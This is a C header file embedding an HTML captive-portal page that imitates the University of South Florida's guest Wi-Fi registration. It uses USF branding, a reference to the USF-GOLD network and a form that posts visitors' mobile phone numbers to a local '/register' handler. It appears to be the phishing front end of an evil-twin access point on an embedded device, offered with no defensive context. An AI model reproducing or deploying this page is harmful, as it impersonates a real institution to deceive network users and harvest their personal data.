#ifndef PORTAL_H
#define PORTAL_H

const char* portalHTML = R"(
<!DOCTYPE html>
<html>
<head>
  <title>USF Network Registration</title>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: Arial, sans-serif; background: #f4f4f4; }
    .header {
      background: #006747;
      padding: 12px 20px;
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .header h1 { color: white; font-size: 20px; }
    .header p { color: #CFC493; font-size: 11px; }
    .banner {
      background: #CFC493;
      color: #333;
      text-align: center;
      padding: 8px;
      font-size: 12px;
    }
    .banner a { color: #006747; font-weight: bold; }
    .content { padding: 20px; max-width: 500px; margin: 0 auto; }
    .content h2 { color: #006747; font-size: 18px; margin-bottom: 8px; }
    .content p { font-size: 13px; color: #444; margin-bottom: 16px; }
    ol { padding-left: 20px; font-size: 13px; color: #444; margin-bottom: 20px; }
    ol li { margin-bottom: 6px; }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #006747;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 15px;
      cursor: pointer;
    }
    .footer { text-align: center; margin-top: 16px; font-size: 12px; color: #999; }
  </style>
</head>
<body>
  <div class='header'>
    <div>
      <h1>USF</h1>
      <p>UNIVERSITY OF SOUTH FLORIDA</p>
    </div>
  </div>
  <div class='banner'>
    If you have a USF NetID, please use the <a href='#'>USF-GOLD</a> wireless network.
  </div>
  <div class='content'>
    <h2>USF Network Registration</h2>
    <p>To access the USF wireless network as a guest, you are required to register your device.</p>
    <ol>
      <li>Tell how to contact you, either by text message or phone call.</li>
      <li>Input your mobile phone number.</li>
      <li>Check your phone.</li>
      <li>Enter the access code we provide.</li>
    </ol>
    <form method='POST' action='/register'>
      <input type='tel' name='phone' placeholder='Mobile Phone Number' />
      <button type='submit'>Send me a text message ›</button>
    </form>
  </div>
  <div class='footer'>Conference.usf.edu users</div>
</body>
</html>
)";

#endif